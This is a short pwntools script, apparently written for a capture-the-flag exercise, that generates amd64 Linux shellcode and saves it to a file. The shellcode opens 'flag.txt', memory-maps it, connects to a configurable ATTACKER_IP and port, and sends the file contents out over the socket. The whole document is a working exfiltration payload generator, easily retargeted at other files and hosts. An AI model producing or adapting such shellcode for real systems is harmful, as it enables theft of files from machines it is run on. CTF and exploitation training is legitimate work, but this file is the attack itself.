#!/usr/bin/env python3
from pwn import *

# --- Configuration ---
# Change this to your listener's IP address and port
ATTACKER_IP = '127.0.0.1'
ATTACKER_PORT = 4444
READ_SIZE = 0x100  # Hardcoded size for mmap and write

# Set the context for the shellcode
context.arch = 'amd64'
context.os = 'linux'

# Initialize an empty string to build the shellcode.
shellcode = ''

# Step 1: Open "flag.txt".
# The open syscall returns the file descriptor in rax.
shellcode += shellcraft.open('flag.txt')
# Save the file descriptor to a non-volatile register (r12)
shellcode += 'mov r12, rax\n'

# Step 2: Map the file into memory with a hardcoded size.
# The mmap syscall returns a pointer to the mapped memory in rax.
shellcode += shellcraft.mmap(0, READ_SIZE, 'PROT_READ', 'MAP_PRIVATE', 'r12', 0)
# Save the memory address pointer to r15.
shellcode += 'mov r15, rax\n'

# Step 3: Create a socket and connect to the attacker.
# pwntools' connect() helper combines socket() and connect() syscalls.
# The socket file descriptor is returned in rax.
shellcode += shellcraft.connect(ATTACKER_IP, ATTACKER_PORT)
# Save the socket file descriptor to r14.
shellcode += 'mov r14, rbp\n'

# Step 4: Write the mmapped content to the socket.
# write(socket_fd, mmap_pointer, hardcoded_size)
shellcode += shellcraft.sendto('r14', 'r15', READ_SIZE, 0, 0)

# Step 5: Cleanly exit.
shellcode += shellcraft.exit(0)

# --- Generate and print the shellcode ---
print("--- Generated Assembly ---")
print(shellcode)

# To get the raw bytes of the shellcode, use the asm() function.
assembled_shellcode = asm(shellcode)
print(f"\n--- Assembled Shellcode ({len(assembled_shellcode)} bytes) ---")
print(assembled_shellcode)

with open("pay", "wb") as f:
    f.write(assembled_shellcode)

